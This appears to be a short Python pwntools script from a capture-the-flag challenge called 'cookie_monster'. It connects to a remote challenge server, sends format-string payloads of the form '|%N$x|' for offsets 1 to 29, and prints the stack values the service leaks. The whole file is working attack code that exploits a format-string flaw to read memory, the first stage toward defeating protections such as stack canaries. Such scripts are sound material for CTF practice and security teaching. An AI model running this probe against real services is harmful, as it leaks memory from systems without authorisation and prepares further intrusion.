from pwn import *

#p=process("./cookie_monster")

for num in range(1,30):
	p = remote('chall.csivit.com',30023)
	payload = "|%"+str(num)+"$x|"
	p.sendline(payload)
	stack =  p.recvline().split('|')[1]
	if stack == "(nil)":
		continue;
	addr = int(stack,16)
	print "leaked addr"+str(num)+": "+hex(addr)
	p.close()
	p.shutdown()